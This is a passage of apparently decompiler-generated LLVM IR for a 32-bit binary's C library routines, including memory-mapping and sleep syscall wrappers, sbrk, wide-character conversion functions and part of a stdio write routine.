  %v1_8051a29 = call i32 @int80_syscall(i32 199)
  store i32 %v1_8051a29, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8051a29, -4095
  br i1 %tmp6, label %dec_label_pc_8051a40, label %dec_label_pc_8051a34

dec_label_pc_8051a34:                             ; preds = %entry
  %v0_8051a34 = load i32, i32* %stack_var_-4, align 4
  %v1_8051a34 = call i32 @__errno_location(i32 %v0_8051a34)
  %v0_8051a39 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051a39 = sub i32 0, %v0_8051a39
  %v2_8051a3b = inttoptr i32 %v1_8051a34 to i32*
  store i32 %v1_8051a39, i32* %v2_8051a3b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051a40

dec_label_pc_8051a40:                             ; preds = %entry, %dec_label_pc_8051a34
  %v0_8051a40 = phi i32 [ %v1_8051a29, %entry ], [ -1, %dec_label_pc_8051a34 ]
  %v2_8051a44 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051a44, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051a40

; uselistorder directives
  uselistorder i32 %v1_8051a29, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051a40, { 1, 0 }
}

define i32 @mremap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051a48 = load i32, i32* @edi, align 4
  %v0_8051a49 = load i32, i32* @esi, align 4
  store i32 %v0_8051a49, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_8051a61 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v6_8051a69 = call i32 @mremap(i32 %v0_8051a61, i32 %v0_8051a49, i32 %v0_8051a48, i32 %tmp6, i32 %arg1, i32 %arg2)
  store i32 %v0_8051a61, i32* @ebx, align 4
  store i32 %v6_8051a69, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v6_8051a69, -4095
  br i1 %tmp11, label %dec_label_pc_8051a81, label %dec_label_pc_8051a75

dec_label_pc_8051a75:                             ; preds = %entry
  %v1_8051a75 = call i32 @__errno_location(i32 %v0_8051a61)
  %v0_8051a7a = load i32, i32* %esi.global-to-local, align 4
  %v1_8051a7a = sub i32 0, %v0_8051a7a
  %v2_8051a7c = inttoptr i32 %v1_8051a75 to i32*
  store i32 %v1_8051a7a, i32* %v2_8051a7c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051a81

dec_label_pc_8051a81:                             ; preds = %entry, %dec_label_pc_8051a75
  %v0_8051a81 = phi i32 [ %v6_8051a69, %entry ], [ -1, %dec_label_pc_8051a75 ]
  %v2_8051a83 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051a83, i32* @edx, align 4
  %v2_8051a84 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051a84, i32* @esi, align 4
  store i32 %v0_8051a48, i32* @edi, align 4
  ret i32 %v0_8051a81

; uselistorder directives
  uselistorder i32 %v6_8051a69, { 1, 0, 2 }
  uselistorder i32 %v0_8051a61, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mremap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051a81, { 1, 0 }
}

define i32 @munmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8051a88 = load i32, i32* @ebx, align 4
  store i32 %v0_8051a88, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8051a9b = call i32 @munmap(i32 %v0_8051a88, i32 %tmp4, i32 %arg1, i32 %arg2)
  store i32 %v4_8051a9b, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v4_8051a9b, -4095
  br i1 %tmp8, label %dec_label_pc_8051ab4, label %dec_label_pc_8051aa8

dec_label_pc_8051aa8:                             ; preds = %entry
  %v0_8051aa8 = load i32, i32* %stack_var_-4, align 4
  %v1_8051aa8 = call i32 @__errno_location(i32 %v0_8051aa8)
  %v0_8051aad = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051aad = sub i32 0, %v0_8051aad
  %v2_8051aaf = inttoptr i32 %v1_8051aa8 to i32*
  store i32 %v1_8051aad, i32* %v2_8051aaf, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051ab4

dec_label_pc_8051ab4:                             ; preds = %entry, %dec_label_pc_8051aa8
  %v0_8051ab4 = phi i32 [ %v4_8051a9b, %entry ], [ -1, %dec_label_pc_8051aa8 ]
  %v2_8051ab6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051ab6, i32* @edx, align 4
  %v2_8051ab8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051ab8, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8051ab4

; uselistorder directives
  uselistorder i32 %v4_8051a9b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @munmap, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051ab4, { 1, 0 }
}

define i32 @__libc_nanosleep(%timespec* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = inttoptr i32 %arg2 to %timespec*
  %stack_var_-4 = alloca i32, align 4
  %v0_8051abc = load i32, i32* @ebx, align 4
  store i32 %v0_8051abc, i32* %stack_var_-4, align 4
  %v4_8051ac0 = ptrtoint %timespec* %arg1 to i32
  store i32 %v4_8051ac0, i32* %ebx.global-to-local, align 4
  %v6_8051acf = call i32 @nanosleep(%timespec* %arg1, %timespec* %tmp4)
  store i32 %v6_8051acf, i32* %ebx.global-to-local, align 4
  %tmp10 = icmp ult i32 %v6_8051acf, -4095
  br i1 %tmp10, label %dec_label_pc_8051ae8, label %dec_label_pc_8051adc

dec_label_pc_8051adc:                             ; preds = %entry
  %v0_8051adc = load i32, i32* %stack_var_-4, align 4
  %v1_8051adc = call i32 @__errno_location(i32 %v0_8051adc)
  %v0_8051ae1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8051ae1 = sub i32 0, %v0_8051ae1
  %v2_8051ae3 = inttoptr i32 %v1_8051adc to i32*
  store i32 %v1_8051ae1, i32* %v2_8051ae3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051ae8

dec_label_pc_8051ae8:                             ; preds = %entry, %dec_label_pc_8051adc
  %v0_8051ae8 = phi i32 [ %v6_8051acf, %entry ], [ -1, %dec_label_pc_8051adc ]
  %v2_8051aec = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051aec, i32* @ebx, align 4
  ret i32 %v0_8051ae8

; uselistorder directives
  uselistorder i32 %v6_8051acf, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder %timespec* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051ae8, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_8051af1 = load i32, i32* @ebx, align 4
  %v0_8051af5 = load i32, i32* @global_var_80603e4.268, align 4
  %v1_8051af5 = icmp eq i32 %v0_8051af5, 0
  %v1_8051b00 = icmp eq i1 %v1_8051af5, false
  br i1 %v1_8051b00, label %dec_label_pc_8051b13, label %dec_label_pc_8051b02

dec_label_pc_8051b02:                             ; preds = %entry
  %v1_8051b07 = call i32 @__GI_brk(i32 0)
  %v2_8051b0f = icmp slt i32 %v1_8051b07, 0
  br i1 %v2_8051b0f, label %dec_label_pc_8051b35, label %dec_label_pc_8051b02.dec_label_pc_8051b13_crit_edge

dec_label_pc_8051b02.dec_label_pc_8051b13_crit_edge: ; preds = %dec_label_pc_8051b02
  %v0_8051b15.pre = load i32, i32* @global_var_80603e4.268, align 4
  br label %dec_label_pc_8051b13

dec_label_pc_8051b13:                             ; preds = %dec_label_pc_8051b02.dec_label_pc_8051b13_crit_edge, %entry
  %v0_8051b23 = phi i32 [ %v0_8051b15.pre, %dec_label_pc_8051b02.dec_label_pc_8051b13_crit_edge ], [ %v0_8051af5, %entry ]
  %v1_8051b13 = icmp eq i32 %arg1, 0
  %v1_8051b1a = icmp eq i1 %v1_8051b13, false
  br i1 %v1_8051b1a, label %dec_label_pc_8051b20, label %dec_label_pc_8051b1c

dec_label_pc_8051b1c:                             ; preds = %dec_label_pc_8051b13
  br label %dec_label_pc_8051b38

dec_label_pc_8051b20:                             ; preds = %dec_label_pc_8051b13
  store i32 %v0_8051b23, i32* @ebx, align 4
  %v2_8051b25 = add i32 %v0_8051b23, %arg1
  %v1_8051b29 = call i32 @__GI_brk(i32 %v2_8051b25)
  %v2_8051b31 = icmp slt i32 %v1_8051b29, 0
  %v1_8051b33 = icmp eq i1 %v2_8051b31, false
  br i1 %v1_8051b33, label %dec_label_pc_8051b20.dec_label_pc_8051b38_crit_edge, label %dec_label_pc_8051b35

dec_label_pc_8051b20.dec_label_pc_8051b38_crit_edge: ; preds = %dec_label_pc_8051b20
  %v0_8051b38.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8051b38

dec_label_pc_8051b35:                             ; preds = %dec_label_pc_8051b20, %dec_label_pc_8051b02
  br label %dec_label_pc_8051b38

dec_label_pc_8051b38:                             ; preds = %dec_label_pc_8051b20.dec_label_pc_8051b38_crit_edge, %dec_label_pc_8051b1c, %dec_label_pc_8051b35
  %v0_8051b38 = phi i32 [ %v0_8051b38.pre, %dec_label_pc_8051b20.dec_label_pc_8051b38_crit_edge ], [ %v0_8051b23, %dec_label_pc_8051b1c ], [ -1, %dec_label_pc_8051b35 ]
  %v2_8051b3a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051b3a, i32* @edx, align 4
  store i32 %v0_8051af1, i32* @ebx, align 4
  ret i32 %v0_8051b38

; uselistorder directives
  uselistorder i32 %v0_8051b23, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_brk, { 1, 0 }
  uselistorder label %dec_label_pc_8051b38, { 2, 0, 1 }
}

define i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8051b40 = load i32, i32* @edi, align 4
  %v0_8051b41 = load i32, i32* @esi, align 4
  store i32 %v0_8051b41, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg4, i32* @esi, align 4
  %v0_8051b55 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_8051b5d = call i32 @wait4(i32 %v0_8051b55, i32 %v0_8051b41, i32 %v0_8051b40, i32 %tmp5)
  store i32 %v0_8051b55, i32* @ebx, align 4
  store i32 %v4_8051b5d, i32* %esi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v4_8051b5d, -4095
  br i1 %tmp10, label %dec_label_pc_8051b75, label %dec_label_pc_8051b69

dec_label_pc_8051b69:                             ; preds = %entry
  %v1_8051b69 = call i32 @__errno_location(i32 %v0_8051b55)
  %v0_8051b6e = load i32, i32* %esi.global-to-local, align 4
  %v1_8051b6e = sub i32 0, %v0_8051b6e
  %v2_8051b70 = inttoptr i32 %v1_8051b69 to i32*
  store i32 %v1_8051b6e, i32* %v2_8051b70, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051b75

dec_label_pc_8051b75:                             ; preds = %entry, %dec_label_pc_8051b69
  %v0_8051b75 = phi i32 [ %v4_8051b5d, %entry ], [ -1, %dec_label_pc_8051b69 ]
  %v2_8051b78 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051b78, i32* @esi, align 4
  store i32 %v0_8051b40, i32* @edi, align 4
  ret i32 %v0_8051b75

; uselistorder directives
  uselistorder i32 %v4_8051b5d, { 1, 0, 2 }
  uselistorder i32 %v0_8051b55, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @wait4, { 1, 0 }
  uselistorder label %dec_label_pc_8051b75, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_80603c4.269 to i32)
}

define i32 @__GI_wcrtomb() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v1_8051b8f = icmp eq i32 %tmp5, 0
  %v1_8051b91 = icmp eq i1 %v1_8051b8f, false
  br i1 %v1_8051b91, label %dec_label_pc_8051b99, label %dec_label_pc_8051b93

dec_label_pc_8051b93:                             ; preds = %entry
  %v2_8051b93 = ptrtoint i32* %stack_var_-24 to i32
  br label %dec_label_pc_8051b99

dec_label_pc_8051b99:                             ; preds = %entry, %dec_label_pc_8051b93
  %v0_8051bb5 = phi i32 [ %tmp5, %entry ], [ %v2_8051b93, %dec_label_pc_8051b93 ]
  %v0_8051b9d = phi i32 [ %tmp4, %entry ], [ 0, %dec_label_pc_8051b93 ]
  %v2_8051b99 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v0_8051b9d, i32* %stack_var_-4, align 4
  store i32 %v2_8051b99, i32* %stack_var_-8, align 4
  %v2_8051bb0 = ptrtoint i32* %stack_var_-8 to i32
  %v5_8051bb6 = inttoptr i32 %v0_8051bb5 to i8*
  %v6_8051bb6 = call i32 @__GI_wcsnrtombs(i8* %v5_8051bb6, i32 %v2_8051bb0, i32 1, i32 16, i32 %tmp)
  %v1_8051bbe = icmp eq i32 %v6_8051bb6, 0
  %v1_8051bc0 = icmp eq i1 %v1_8051bbe, false
  br i1 %v1_8051bc0, label %dec_label_pc_8051bc4, label %dec_label_pc_8051bc2

dec_label_pc_8051bc2:                             ; preds = %dec_label_pc_8051b99
  %v1_8051bc2 = and i32 %v6_8051bb6, -256
  %v2_8051bc2 = or i32 %v1_8051bc2, 1
  br label %dec_label_pc_8051bc4

dec_label_pc_8051bc4:                             ; preds = %dec_label_pc_8051b99, %dec_label_pc_8051bc2
  %v0_8051bc7 = phi i32 [ %v6_8051bb6, %dec_label_pc_8051b99 ], [ %v2_8051bc2, %dec_label_pc_8051bc2 ]
  ret i32 %v0_8051bc7

; uselistorder directives
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_8051bc4, { 1, 0 }
  uselistorder label %dec_label_pc_8051b99, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %v5_8051bdd = inttoptr i32 %tmp to i8*
  %v6_8051bdd = call i32 @__GI_wcsnrtombs(i8* %v5_8051bdd, i32 %tmp1, i32 -1, i32 %tmp2, i32 %tmp3)
  ret i32 %v6_8051bdd
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8051beb = load i32, i32* @ebx, align 4
  %v4_8051bef = ptrtoint i8* %arg1 to i32
  store i32 %v4_8051bef, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  store i32 %arg4, i32* %eax.global-to-local, align 4
  %v1_8051bfb = icmp eq i8* %arg1, null
  br i1 %v1_8051bfb, label %dec_label_pc_8051c2f.thread, label %dec_label_pc_8051bff

dec_label_pc_8051bff:                             ; preds = %entry
  store i32 1, i32* %edi.global-to-local, align 4
  %v12_8051c04 = icmp eq i32 %v4_8051bef, %arg2
  %v1_8051c06 = icmp eq i1 %v12_8051c04, false
  br i1 %v1_8051c06, label %dec_label_pc_8051c2f, label %dec_label_pc_8051c29

dec_label_pc_8051c2f.thread:                      ; preds = %entry
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8051c0c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051c0c, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051c39

dec_label_pc_8051c15:                             ; preds = %dec_label_pc_8051c40
  %v1_8051c15 = call i32 @__errno_location(i32 %v0_8051beb)
  store i32 %v1_8051c15, i32* %eax.global-to-local, align 4
  %v1_8051c1a = inttoptr i32 %v1_8051c15 to i32*
  store i32 84, i32* %v1_8051c1a, align 4
  br label %dec_label_pc_8051c66

dec_label_pc_8051c25:                             ; preds = %dec_label_pc_8051c47
  store i32 0, i32* %esi.global-to-local, align 4
  %v0_8051c5b.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051c57

dec_label_pc_8051c29:                             ; preds = %dec_label_pc_8051bff
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8051c2b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051c2b, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051c2f

dec_label_pc_8051c2f:                             ; preds = %dec_label_pc_8051bff, %dec_label_pc_8051c29
  %v2_8051c4715 = phi i32 [ %v4_8051bef, %dec_label_pc_8051bff ], [ %v2_8051c2b, %dec_label_pc_8051c29 ]
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %tmp33 = icmp ult i32 %arg4, %arg3
  br i1 %tmp33, label %dec_label_pc_8051c37, label %dec_label_pc_8051c39

dec_label_pc_8051c37:                             ; preds = %dec_label_pc_8051c2f
  store i32 %arg4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8051c39

dec_label_pc_8051c39:                             ; preds = %dec_label_pc_8051c2f.thread, %dec_label_pc_8051c2f, %dec_label_pc_8051c37
  %v2_8051c471532 = phi i32 [ %v2_8051c4715, %dec_label_pc_8051c2f ], [ %v2_8051c4715, %dec_label_pc_8051c37 ], [ %v2_8051c0c, %dec_label_pc_8051c2f.thread ]
  %v0_8051c3c = phi i32 [ %arg3, %dec_label_pc_8051c2f ], [ %arg4, %dec_label_pc_8051c37 ], [ %arg3, %dec_label_pc_8051c2f.thread ]
  %v1_8051c39 = inttoptr i32 %arg2 to i32*
  %v2_8051c39 = load i32, i32* %v1_8051c39, align 4
  store i32 %v2_8051c39, i32* %esi.global-to-local, align 4
  store i32 %v0_8051c3c, i32* @ecx, align 4
  %v1_8051c533 = icmp eq i32 %v0_8051c3c, 0
  %v1_8051c5510 = icmp eq i1 %v1_8051c533, false
  br i1 %v1_8051c5510, label %dec_label_pc_8051c40, label %dec_label_pc_8051c57

dec_label_pc_8051c40:                             ; preds = %dec_label_pc_8051c39, %dec_label_pc_8051c4d
  %v2_8051c47 = phi i32 [ %v2_8051c50, %dec_label_pc_8051c4d ], [ %v2_8051c471532, %dec_label_pc_8051c39 ]
  %v0_8051c40 = phi i32 [ %v1_8051c4d, %dec_label_pc_8051c4d ], [ %v2_8051c39, %dec_label_pc_8051c39 ]
  %v1_8051c40 = inttoptr i32 %v0_8051c40 to i32*
  %v2_8051c40 = load i32, i32* %v1_8051c40, align 4
  store i32 %v2_8051c40, i32* %eax.global-to-local, align 4
  %v6_8051c45 = icmp ugt i32 %v2_8051c40, 127
  br i1 %v6_8051c45, label %dec_label_pc_8051c15, label %dec_label_pc_8051c47

dec_label_pc_8051c47:                             ; preds = %dec_label_pc_8051c40
  %v1_8051c47 = trunc i32 %v2_8051c40 to i8
  %v3_8051c47 = inttoptr i32 %v2_8051c47 to i8*
  store i8 %v1_8051c47, i8* %v3_8051c47, align 1
  %v0_8051c49 = load i32, i32* %eax.global-to-local, align 4
  %v3_8051c49 = trunc i32 %v0_8051c49 to i8
  %v4_8051c49 = icmp eq i8 %v3_8051c49, 0
  br i1 %v4_8051c49, label %dec_label_pc_8051c25, label %dec_label_pc_8051c4d

dec_label_pc_8051c4d:                             ; preds = %dec_label_pc_8051c47
  %v0_8051c4d = load i32, i32* %esi.global-to-local, align 4
  %v1_8051c4d = add i32 %v0_8051c4d, 4
  store i32 %v1_8051c4d, i32* %esi.global-to-local, align 4
  %v0_8051c50 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051c50 = load i32, i32* %edi.global-to-local, align 4
  %v2_8051c50 = add i32 %v1_8051c50, %v0_8051c50
  store i32 %v2_8051c50, i32* %edx.global-to-local, align 4
  %v0_8051c52 = load i32, i32* @ecx, align 4
  %v1_8051c52 = add i32 %v0_8051c52, -1
  %v8_8051c52 = icmp eq i32 %v1_8051c52, 0
  store i32 %v1_8051c52, i32* @ecx, align 4
  %v1_8051c55 = icmp eq i1 %v8_8051c52, false
  br i1 %v1_8051c55, label %dec_label_pc_8051c40, label %dec_label_pc_8051c57

dec_label_pc_8051c57:                             ; preds = %dec_label_pc_8051c4d, %dec_label_pc_8051c39, %dec_label_pc_8051c25
  %v0_8051c5f = phi i32 [ 0, %dec_label_pc_8051c25 ], [ %v2_8051c39, %dec_label_pc_8051c39 ], [ %v1_8051c4d, %dec_label_pc_8051c4d ]
  %v0_8051c5b = phi i32 [ %v0_8051c5b.pre, %dec_label_pc_8051c25 ], [ %v2_8051c471532, %dec_label_pc_8051c39 ], [ %v2_8051c50, %dec_label_pc_8051c4d ]
  %v2_8051c57 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8051c57, i32* %eax.global-to-local, align 4
  %v12_8051c5b = icmp eq i32 %v0_8051c5b, %v2_8051c57
  br i1 %v12_8051c5b, label %dec_label_pc_8051c62, label %dec_label_pc_8051c5f

dec_label_pc_8051c5f:                             ; preds = %dec_label_pc_8051c57
  %v1_8051c5f = load i32, i32* %ebp.global-to-local, align 4
  %v2_8051c5f = inttoptr i32 %v1_8051c5f to i32*
  store i32 %v0_8051c5f, i32* %v2_8051c5f, align 4
  br label %dec_label_pc_8051c62

dec_label_pc_8051c62:                             ; preds = %dec_label_pc_8051c57, %dec_label_pc_8051c5f
  %v0_8051c62 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8051c62, i32* %eax.global-to-local, align 4
  %v1_8051c64 = load i32, i32* @ecx, align 4
  %v2_8051c64 = sub i32 %v0_8051c62, %v1_8051c64
  br label %dec_label_pc_8051c66

dec_label_pc_8051c66:                             ; preds = %dec_label_pc_8051c15, %dec_label_pc_8051c62
  %storemerge1 = phi i32 [ %v2_8051c64, %dec_label_pc_8051c62 ], [ -1, %dec_label_pc_8051c15 ]
  store i32 %storemerge1, i32* %eax.global-to-local, align 4
  store i32 %v0_8051beb, i32* @ebx, align 4
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v2_8051c50, { 0, 2, 1 }
  uselistorder i32 %v1_8051c4d, { 0, 2, 1 }
  uselistorder i32 %v2_8051c39, { 1, 0, 2 }
  uselistorder i32 %v0_8051c3c, { 1, 0 }
  uselistorder i32 %v2_8051c471532, { 1, 0 }
  uselistorder i32 %v4_8051bef, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %edi.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 3, 0 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4, 6, 5, 7 }
  uselistorder i32 127, { 1, 0, 4, 2, 5, 3 }
  uselistorder i32 %arg4, { 2, 1, 0, 3 }
  uselistorder i32 %arg3, { 0, 1, 3, 4, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051c66, { 1, 0 }
  uselistorder label %dec_label_pc_8051c62, { 1, 0 }
  uselistorder label %dec_label_pc_8051c40, { 1, 0 }
  uselistorder label %dec_label_pc_8051c39, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051c2f, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %v0_8051c71 = load i32, i32* @edi, align 4
  %v0_8051c73 = load i32, i32* @ebx, align 4
  %v4_8051c77 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8051c77, i32* @edi, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_8051c834 = icmp eq i32 %arg3, 0
  br i1 %v1_8051c834, label %dec_label_pc_8051ce2, label %dec_label_pc_8051c88.lr.ph

dec_label_pc_8051c88.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8051c88

dec_label_pc_8051c88:                             ; preds = %dec_label_pc_8051ca7.dec_label_pc_8051c88_crit_edge, %dec_label_pc_8051c88.lr.ph
  %v0_8051c98 = phi i32 [ %v4_8051c77, %dec_label_pc_8051c88.lr.ph ], [ %v0_8051c98.pre, %dec_label_pc_8051ca7.dec_label_pc_8051c88_crit_edge ]
  %v0_8051c97 = phi i32 [ %arg2, %dec_label_pc_8051c88.lr.ph ], [ %v2_8051ca9, %dec_label_pc_8051ca7.dec_label_pc_8051c88_crit_edge ]
  %v0_8051c8a.in = phi i32 [ %arg3, %dec_label_pc_8051c88.lr.ph ], [ %v2_8051ca7, %dec_label_pc_8051ca7.dec_label_pc_8051c88_crit_edge ]
  %v0_8051c8a = icmp slt i32 %v0_8051c8a.in, 0
  store i32 %v0_8051c8a.in, i32* %ebp.global-to-local, align 4
  %v2_8051c8a = icmp eq i1 %v0_8051c8a, false
  %storemerge = select i1 %v2_8051c8a, i32 %v0_8051c8a.in, i32 2147483647
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8051c98 = add i32 %v0_8051c98, 4
  %v2_8051c98 = inttoptr i32 %v1_8051c98 to i32*
  %v3_8051c98 = load i32, i32* %v2_8051c98, align 4
  %tmp36 = inttoptr i32 %v0_8051c97 to i32*
  %v5_8051c9b = call i32 @__libc_write(i32 %v3_8051c98, i32* %tmp36, i32 %storemerge)
  store i32 %v5_8051c9b, i32* %eax.global-to-local, align 4
  %v2_8051ca3 = icmp slt i32 %v5_8051c9b, 0
  br i1 %v2_8051ca3, label %dec_label_pc_8051cad, label %dec_label_pc_8051ca7

dec_label_pc_8051ca7:                             ; preds = %dec_label_pc_8051c88
  %v0_8051ca7 = load i32, i32* @ebx, align 4
  %v2_8051ca7 = sub i32 %v0_8051ca7, %v5_8051c9b
  %v12_8051ca7 = icmp eq i32 %v2_8051ca7, 0
  store i32 %v2_8051ca7, i32* @ebx, align 4
  %v0_8051ca9 = load i32, i32* %esi.global-to-local, align 4
  %v2_8051ca9 = add i32 %v0_8051ca9, %v5_8051c9b
  store i32 %v2_8051ca9, i32* %esi.global-to-local, align 4
  br i1 %v12_8051ca7, label %dec_label_pc_8051ce2, label %dec_label_pc_8051ca7.dec_label_pc_8051c88_crit_edge

dec_label_pc_8051ca7.dec_label_pc_8051c88_crit_edge: ; preds = %dec_label_pc_8051ca7
  %v0_8051c98.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8051c88

dec_label_pc_8051cad:                             ; preds = %dec_label_pc_8051c88
  %v0_8051cad = load i32, i32* @edi, align 4
  %v1_8051cad = add i32 %v0_8051cad, 8
  %v2_8051cad = inttoptr i32 %v1_8051cad to i32*
  %v3_8051cad = load i32, i32* %v2_8051cad, align 4
  store i32 %v3_8051cad, i32* @edx, align 4
  %v1_8051cb0 = add i32 %v0_8051cad, 12
  %v2_8051cb0 = inttoptr i32 %v1_8051cb0 to i32*
  %v3_8051cb0 = load i32, i32* %v2_8051cb0, align 4
  store i32 %v3_8051cb0, i32* %eax.global-to-local, align 4
  %v1_8051cb3 = inttoptr i32 %v0_8051cad to i16*
  %v2_8051cb3 = load i16, i16* %v1_8051cb3, align 2
  %v3_8051cb3 = or i16 %v2_8051cb3, 8
  store i16 %v3_8051cb3, i16* %v1_8051cb3, align 2
  %v0_8051cb7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051cb7 = load i32, i32* @edx, align 4
  %v2_8051cb7 = sub i32 %v0_8051cb7, %v1_8051cb7
  %v12_8051cb7 = icmp eq i32 %v2_8051cb7, 0
  store i32 %v2_8051cb7, i32* %eax.global-to-local, align 4
  %v4_8051cde.pre = load i32, i32* @ebx, align 4
  br i1 %v12_8051cb7, label %dec_label_pc_8051cde, label %dec_label_pc_8051cbb

dec_label_pc_8051cbb:                             ; preds = %dec_label_pc_8051cad
